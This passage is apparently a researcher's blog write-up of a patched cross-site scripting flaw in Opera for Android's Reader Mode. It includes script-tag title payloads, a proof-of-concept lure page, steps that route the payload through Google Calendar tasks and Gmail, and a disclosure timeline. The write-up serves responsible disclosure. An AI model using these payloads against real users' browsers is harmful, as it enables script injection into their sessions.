+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS via Opera Reader Mode Title&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span></code></pre></div><ol>
+<li>
+<p>User opens an attacker-controlled page.</p>
+</li>
+<li>
+<p>Opera&rsquo;s native parser extracts the <code>&lt;title&gt;</code> and passes it to <code>receivedHtmlMetaData</code>.</p>
+</li>
+<li>
+<p>Java receives it as:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;title&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&lt;script&gt;alert(...)&lt;/script&gt;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div></li>
+<li>
+<p>User activates Reader Mode.</p>
+</li>
+<li>
+<p>Reader Mode UI renders the title, executing the embedded JavaScript.</p>
+</li>
+</ol>
+<h3 id="proof-of-concept-poc"><strong>Proof of Concept (PoC)</strong><a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-poc">#</a></h3>
+<p>One reliable vector is <strong>Google Calendar tasks</strong>, which allow custom text that gets embedded into HTML titles.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS in Opera Reader Mode - &#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">article</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Fake News Headline<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Engaging content to lure Reader Mode activation...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">article</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h3 id="steps-to-reproduce"><strong>Steps to Reproduce</strong><a hidden class="anchor" aria-hidden="true" href="#steps-to-reproduce">#</a></h3>
+<ol>
+<li>
+<p>Create a task with this title:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS in Opera Reader Mode - &#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Email the task to yourself (produces a shareable Gmail link).</p>
+</li>
+<li>
+<p>Extract the message ID from the shared link.</p>
+</li>
+<li>
+<p>Visit the constructed URL:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://mail.google.com/mail/u/0/#inbox/[MESSAGE_ID]?ogbl
+</span></span></code></pre></div></li>
+<li>
+<p>Open the link in Opera Browser for Android.</p>
+</li>
+<li>
+<p>Enable Reader Mode.</p>
+</li>
+<li>
+<p>Observe:</p>
+<ul>
+<li>Clean article body (distilled).</li>
+<li>JavaScript alert executes immediately due to the unsanitized title.</li>
+</ul>
+</li>
+</ol>
+<h3 id="disclosure-timeline"><strong>Disclosure Timeline</strong><a hidden class="anchor" aria-hidden="true" href="#disclosure-timeline">#</a></h3>
+<ul>
+<li><strong>September 21, 2020</strong> — Vulnerability discovered</li>
+<li><strong>September 23, 2020</strong> — Reported to Opera Security</li>
+<li><strong>September 25, 2020</strong> — Vendor acknowledged issue</li>
+<li><strong>September 29, 2020</strong> — Patch released</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    <footer class="footer">
+    <span>&copy; 2025 Neilmark Ochea / 0xnmo</span>
+</footer></body>
+
+</html>
